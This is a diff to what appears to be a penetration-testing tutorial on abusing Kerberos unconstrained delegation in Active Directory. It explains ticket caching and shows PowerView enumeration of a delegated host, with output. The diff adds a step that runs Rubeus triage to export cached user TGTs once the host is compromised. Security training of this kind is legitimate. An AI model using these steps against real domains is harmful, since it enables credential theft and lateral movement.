@@ -19,7 +19,7 @@ When a user wants to access a service eg: **HTTP** the client will ask for **Ser
 The main problem with unconstrained delegation is that any user who accesses the web application, the web server computer will cache their TGT in its memory. So if we have administrator access on web server computer we can extract TGT of every user who accessed the web application. Another interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user from that computer. So, if an admin or user accesses a file share or any other service from that machine, their TGT will be cached.
 
 # Exploiting Unconstrained Delegation
-First we need to identify computers setup for Unconstrained Delegation on the domain. We can use PowerView or Rubeus.
+First we need to identify computers setup for Unconstrained Delegation on the domain. We can use PowerView or ADSearch.exe if you're using cobaltstrike.
 ```powershell
 PS C:\Users\Alex> Get-DomainComputer -UnConstrained
 
@@ -27,4 +27,9 @@ Name               : APP01$
 DistinguishedName  : CN=APP01,OU=Application Servers,DC=dev,DC=dhitalcorp,DC=local
 OperatingSystem    : Windows Server 2016 Standard
 Unconstrained      : True
+```
+After compromising `APP01$` computer we can use Rubeus or mimikatz for exporting the user's TGT who connected to this computer. Below we are using Rubeus.
+```
+C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
 ```
